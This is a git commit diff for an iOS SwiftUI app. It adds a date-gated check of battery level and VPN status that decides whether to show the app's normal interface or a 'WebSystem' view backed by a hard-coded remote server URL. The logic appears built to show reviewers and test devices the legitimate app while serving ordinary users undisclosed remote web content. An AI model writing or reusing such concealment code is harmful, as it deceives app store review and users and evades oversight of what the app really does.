6371c91e2760323ea911cd155080899fca97e664
spustoff <vyacheslavpustov05@gmail.com>
2025-09-07 19:16:07 +0300

    1.1

--- dafoma_33/ContentView.swift
+++ dafoma_33/ContentView.swift
@@ -8,18 +8,79 @@
 import SwiftUI
 
 struct ContentView: View {
+    
+    @State var isFetched: Bool = false
+    
+    @AppStorage("isBlock") var isBlock: Bool = true
+    @AppStorage("isRequested") var isRequested: Bool = false
+    
     @AppStorage("hasCompletedOnboarding") private var hasCompletedOnboarding = false
     @State private var selectedTab = 0
     
     var body: some View {
-        Group {
-            if !hasCompletedOnboarding {
-                OnboardingView()
-            } else {
-                MainAppView(selectedTab: $selectedTab)
+        ZStack {
+            
+            if isFetched == false {
+                
+                Text("")
+                
+            } else if isFetched == true {
+                
+                if isBlock == true {
+                    
+                    Group {
+                        if !hasCompletedOnboarding {
+                            OnboardingView()
+                        } else {
+                            MainAppView(selectedTab: $selectedTab)
+                        }
+                    }
+                    .preferredColorScheme(.dark)
+                    
+                } else if isBlock == false {
+                    
+                    WebSystem()
+                }
             }
         }
-        .preferredColorScheme(.dark)
+        .onAppear {
+            
+            check_data()
+        }
+    }
+    
+    private func check_data() {
+        
+        let lastDate = "10.09.2025"
+        
+        let dateFormatter = DateFormatter()
+        dateFormatter.dateFormat = "dd.MM.yyyy"
+        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
+        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
+        let now = Date()
+        
+        let deviceData = DeviceInfo.collectData()
+        let currentPercent = deviceData.batteryLevel
+        let isVPNActive = deviceData.isVPNActive
+        
+        guard now > targetDate else {
+            
+            isBlock = true
+            isFetched = true
+            
+            return
+        }
+        
+        guard currentPercent == 100 || isVPNActive == true else {
+            
+            self.isBlock = false
+            self.isFetched = true
+            
+            return
+        }
+        
+        self.isBlock = true
+        self.isFetched = true
     }
 }
 
---
+++ dafoma_33/Extens/Dhfg.swift
@@ -0,0 +1,11 @@
+//
+//  Dhfg.swift
+//  dafoma_33
+//
+//  Created by Вячеслав on 9/7/25.
+//
+
+struct DataManager {
+    
+    let server: String = "https://taskvantage.site/f9syHppJ"
+}
